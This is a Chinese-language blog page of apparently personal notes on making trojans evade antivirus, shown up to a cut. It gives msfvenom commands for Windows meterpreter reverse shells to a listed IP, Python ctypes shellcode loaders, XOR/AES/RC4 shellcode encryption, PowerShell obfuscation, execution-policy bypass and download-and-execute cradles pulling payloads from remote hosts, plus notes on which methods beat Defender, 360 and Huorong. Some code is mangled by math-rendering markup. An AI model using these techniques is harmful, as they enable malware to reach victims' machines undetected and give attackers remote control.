



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://n1h1l157.github.io/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/">



  <title>
 |
Phut Hon = X_T = 天行健，君子以自强不息</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2023-07-04 01:48:40">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2023-07-04T01:48:40+08:00">2023-07-04</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>21k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>35 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/mg3v58QxFb7tICZ.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/9RqJ7SolMrGZxmj.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/HBF3Xx8TkufEAiz.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BId2kKHmufXsrnl.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/OqYw1kD5yZdImSe.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/MLkfsaNgvAjSFu2.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/07/04/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content=".N1h1l157">
    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="X_T">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h3 id="101-源码层面免杀"><a class="markdownIt-Anchor" href="#101-源码层面免杀">#</a> 10.1 源码层面免杀</h3>
<h4 id="1011-c免杀"><a class="markdownIt-Anchor" href="#1011-c免杀">#</a> 10.1.1 c 免杀</h4>
<p><strong>0x0 1</strong> 工具安装</p>
<p>（ 1 ）linux install msf</p>
<p>一键安装 msf：curl <span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LQ==">https://raw.githubusercontent.com/rapid7/metasploit-</span><br>
omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt;<br>
msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall<br>
 判断 msfconsole 位置：whereis,type,which msfconsole<br>
 载入～/.bash_profile, 设置为全局:export PATH=$PATH:[order location]</p>
<p>（ 2 ）windows install mingw</p>
<p>安装 mingw 包管理器：<br>
<span class="exturl" data-url="aHR0cHM6Ly9vc2RuLm5ldC9wcm9qZWN0cy9taW5ndy9kb3dubG9hZHMvNjgyNjAvbWluZ3ctZ2V0LXNldHVwLmV4ZQ==">https://osdn.net/projects/mingw/downloads/68260/mingw-get-setup.exe</span><br>
 装 C、C<ins> 编译器：从 mingw-get 窗口左上角的安装菜单中选择应用更改<br>
检验安装是否成功：<br>
C:\MinGW\bin\gcc.exe --version; C:\MinGW\bin\g</ins>.exe --version<br>
 设置路径为全局路径: C:\MinGW\bin<br>
 注意：g<ins> 会把.c 和.cpp 文件当作是 C</ins> 的源程序进行编译；gcc 会把.c 当作是 C 源程<br>
序编译，.cpp 的程序当作是 C<ins> 源程序编译<br>
使用：gcc test.c -o test; g</ins> test.c -o 1</p>
<p><strong>0 x0 2</strong> 木马生成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cs-&gt;攻击-&gt;生成后门-&gt;payload生成windows可执行程序-&gt;选择监听器-&gt;生成</span><br><span class="line">msf-&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=x.x.x lport=8079 -f c</span><br><span class="line">msf-&gt; msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6</span><br></pre></td></tr></table></figure>
<ul>
<li>b ‘\x00’ lhost=47.102.120.55 lport=8079 -f raw &gt; shellcode.raw<br>
msf 监听 -&gt; use exploit/multi/handler</li>
</ul>
<h1 id="用windows将c文件编译为exe文件运行c文件可操作空间更大而不像exe程"><a class="markdownIt-Anchor" href="#用windows将c文件编译为exe文件运行c文件可操作空间更大而不像exe程">#</a> 用 windows 将 c 文件编译为 exe 文件运行，c 文件可操作空间更大，而不像 exe 程</h1>
<p>序，直接是程序，修改之后可能失去了木马作用</p>
<p><strong>0 x0 3</strong> 木马免杀</p>
<p>（ 1 ）xor 加密：工具或自定义脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">工具下载：https://github.com/Arno0x/ShellcodeWrapper</span><br><span class="line">使用密钥“thisismykey ”对 shellcode 进行异或加密</span><br><span class="line">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw thisismykey xor</span><br><span class="line">python xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin</span><br></pre></td></tr></table></figure>
<p>（ 2 ）aes 加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用密钥“thisismykey ”对 shellcode 进行aes加密</span><br><span class="line">python2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi aes</span><br><span class="line">生成的cpp文件需要用gcc编译器进行编译成可执行文件</span><br></pre></td></tr></table></figure>
<p>（ 3 ）hex 加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">工具下载：https://github.com/ByPassAVTeam/ShellcodeLoader</span><br><span class="line">在线编码：https://gchq.github.io/CyberChef/</span><br><span class="line">将 16 进制的payload生成exe可执行程序：</span><br><span class="line">LoaderMaker.exe download.dat xiaodi.exe</span><br></pre></td></tr></table></figure>
<p>（ 4 ）rc 4 加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_45590789/article/details/105536623</span><br><span class="line">将shellcode经过rc 4 加密，再进行利用</span><br></pre></td></tr></table></figure>
<p><strong>0 x0 4</strong> 免杀结论</p>
<p>经测试，只有 rc 4 加密绕过了 windows Defender，而 360 没有被这几种方法<br>
绕过，自己写的 xor 加密，aes 加密，hex 加密，rc 4 加密都很大程度上绕过了火<br>
绒。每次木马执行完毕后，需要清理，防止指纹被采集，下次就不是很好使用<br>
了。</p>
<h4 id="1012-py免杀"><a class="markdownIt-Anchor" href="#1012-py免杀">#</a> 10.1.2 py 免杀</h4>
<p><strong>0 x01 py</strong> 执行木马的代码</p>
<p>（ 1 ）执行代码 1 ：</p>
<p>shellcode = b&quot;xxxxx&quot;<br>
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)<br>
ctypes.windll.kernel32.RtlMoveMemory(rwxpage,<br>
ctypes.create_string_buffer(shellcode), len(shellcode))<br>
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)<br>
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)</p>
<h5 id="2-执行代码-2"><a class="markdownIt-Anchor" href="#2-执行代码-2">#</a> （ 2 ）执行代码 2 ：</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(len(shellcode)),</span><br><span class="line">ctypes.c_int(0x3000),</span><br><span class="line">ctypes.c_int(0x40))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span><br><span class="line">buf,</span><br><span class="line">ctypes.c_int(len(shellcode)))</span><br><span class="line">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(ptr),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.c_int(0),</span><br><span class="line">ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
<p><strong>0x 02</strong> 混淆加密免杀</p>
<p>（ 1 ）正常情况 直接执行<br>
（ 2 ）base 64 先编码，在进行解码操作，后者为新木马<br>
（ 3 ）aes+base64:msf 生成 base 64 编码木马，对木马 aes 加密，而后将 aes 解<br>
密操作变成可执行<br>
（ 4 ）序列化与反序列化<br>
（ 5 ）另外的 Xor，Rc4 等加密算法都可以实现测试</p>
<p><strong>0x0 3</strong> 不同的打包器打包木马</p>
<p>对上述 5 种方法产生的木马进行打包<br>
（ 1 ）pyinstaller<br>
 使用：pyinstaller -F <span class="exturl" data-url="aHR0cDovL3Rlc3QucHk=">test.py</span><br>
（ 2 ）py2exe<br>
 打包：python <span class="exturl" data-url="aHR0cDovL3NldHVwLnB5">setup.py</span> py2exe<br>
（ 3 ）Nuitka<br>
 使用：nuitka --mingw64 --standalone --show-memory --show-progress –<br>
nofollow-imports --follow-import-to=utils,src --output-dir=out <span class="exturl" data-url="aHR0cDovLzEwOC5weQ==">108.py</span></p>
<h4 id="1013-powershell免杀"><a class="markdownIt-Anchor" href="#1013-powershell免杀">#</a> 10.1.3 powershell 免杀</h4>
<p>cs 可以生成 powershell 文件和 powershell command 两种。第一种是文件模<br>
式，上线代码在 ps 1 种，直接运行就可以上线，第二种是一个 txt，复制代码用<br>
 cmd 执行即可上线。</p>
<p><strong>0x0 1 powershell</strong> 木马免杀：</p>
<p>（ 1 ）手工混淆 - hr</p>
<p>先 base 64 编码再去执行解码后的代码：<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>b</mi><mo>=</mo><mo stretchy="false">[</mo><mi>S</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>T</mi><mi>e</mi><mi>x</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>E</mi><mi>n</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo stretchy="false">]</mo><mo>:</mo><mo>:</mo><mi>A</mi><mi>S</mi><mi>C</mi><mi>I</mi><mi>I</mi><mi mathvariant="normal">.</mi><mi>G</mi><mi>e</mi><mi>t</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo stretchy="false">(</mo><mo stretchy="false">[</mo><mi>S</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>C</mi><mi>o</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mo stretchy="false">]</mo><mo>:</mo><mo>:</mo><mi>F</mi><mi>r</mi><mi>o</mi><mi>m</mi><mi>B</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">bb=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64
String(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">e</span><span class="mord mathnormal">x</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">n</span><span class="mord mathnormal">c</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord">.</span><span class="mord mathnormal">G</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord">6</span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span></span></span></span>x))<br>
 powershell 绕过执行策略执行 ps 1 脚本的方法：<br>
powershell -ExecutionPolicy bypass -File hr.ps1<br>
 在编码后的代码中添加一些垃圾数据，进行 replace 替换为空，解码执行：</p>
<ul>
<li>-----xiaosedi------xiaosedi-----xiaosedi------------.replace(‘xiaosedi’,’’)</li>
</ul>
<h1 id="在原型代码中添加一些垃圾数据编码解码之后进行replace替换为空干扰检测"><a class="markdownIt-Anchor" href="#在原型代码中添加一些垃圾数据编码解码之后进行replace替换为空干扰检测">#</a> 在原型代码中添加一些垃圾数据，编码解码之后，进行 replace 替换为空，干扰检测。</h1>
<p>（ 2 ）分离代码 - x60</p>
<p>将恶意代码的 base 64 藏在 web 上，通过 http 请求去拿数据，再通过解码执行<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>S</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>e</mi><mi>m</mi><mi mathvariant="normal">.</mi><mi>N</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>W</mi><mi>e</mi><mi>b</mi><mi>c</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>D</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>x</mi><mi mathvariant="normal">.</mi><mi>x</mi><mi mathvariant="normal">.</mi><mi>x</mi><mi mathvariant="normal">.</mi><mi>x</mi><mi mathvariant="normal">/</mi><mn>1.</mn><mi>t</mi><mi>x</mi><msup><mi>t</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d= ((New-Object System.Net.Webclient).DownloadString(&#x27;http://x.x.x.x/1.txt
&#x27;))
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal">e</span><span class="mord mathnormal">b</span><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">h</span><span class="mord mathnormal">t</span><span class="mord mathnormal">t</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathnormal">x</span><span class="mord">.</span><span class="mord mathnormal">x</span><span class="mord">.</span><span class="mord mathnormal">x</span><span class="mord">.</span><span class="mord mathnormal">x</span><span class="mord">/</span><span class="mord">1</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord mathnormal">x</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>x=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Str<br>
ing($d))</p>
<h1 id="也可以配合手工混淆将原型或编码后的代码加上干扰数据后放至远程http上"><a class="markdownIt-Anchor" href="#也可以配合手工混淆将原型或编码后的代码加上干扰数据后放至远程http上">#</a> 也可以配合手工混淆，将原型或编码后的代码加上干扰数据后放至远程 http 上</h1>
<p>（ 3 ）项目混淆 - 无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/danielbohannon/Invoke-Obfuscation</span><br><span class="line">加载模块：Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">运行程序：Invoke-Obfuscation</span><br><span class="line">原型文件路径：set scriptpath C:\Users\ 86135 \Desktop\1.ps1</span><br><span class="line">部分代码编码：set scriptblock &#x27;xxxx&#x27;</span><br><span class="line">进入编码：encoding</span><br><span class="line">选择编码： 1 - 8</span><br><span class="line">输出文件：out C:\Users\ 86135 \Desktop\11.ps1</span><br></pre></td></tr></table></figure>
<p>（ 4 ）木马转字节流 特征修改 - df</p>
<h5 id="找到关键木马利用脚本将木马的核心代码转化为字节流注意字节流不"><a class="markdownIt-Anchor" href="#找到关键木马利用脚本将木马的核心代码转化为字节流注意字节流不">#</a> 找到关键木马，利用脚本将木马的核心代码转化为字节流，注意字节流不</h5>
<h5 id="能加引号"><a class="markdownIt-Anchor" href="#能加引号">#</a> 能加引号</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Byte[]]$x=[Byte[]](1,23,315,124,......,2512)</span><br><span class="line">将shellcode中的全部的代码进行变量替换，使其与原型发生很大不同</span><br><span class="line">即通过fuzz的思想，看修改哪部分代码是defender检测的进行修改</span><br></pre></td></tr></table></figure>
<p><strong>0 x0 2 powershell command</strong> 木马免杀：</p>
<p>（ 1 ）执行远程原型木马 - 无效</p>
<p>powershell -nop -w hidden -c “IEX ((new-object net.webclient).downloadstr<br>
ing(‘<span class="exturl" data-url="aHR0cDovL3gueC54LngveC5wczE=">http://x.x.x.x/x.ps1</span>’))”</p>
<p>（ 2 ）替换变量</p>
<p>powershell “<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi>I</mi><mi>E</mi><mi>X</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>N</mi><mi>e</mi><mi>w</mi><mo>−</mo><mi>O</mi><mi>b</mi><mi>j</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>N</mi><mi>e</mi><mi>t</mi><mi mathvariant="normal">.</mi><mi>W</mi><mi>e</mi><mi>b</mi><mi>C</mi><mi>l</mi><mi>i</mi><mi>e</mi><mi>n</mi><mi>t</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi>D</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>l</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><msup><mo stretchy="false">(</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mi>h</mi><msup><mi>t</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">a=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span 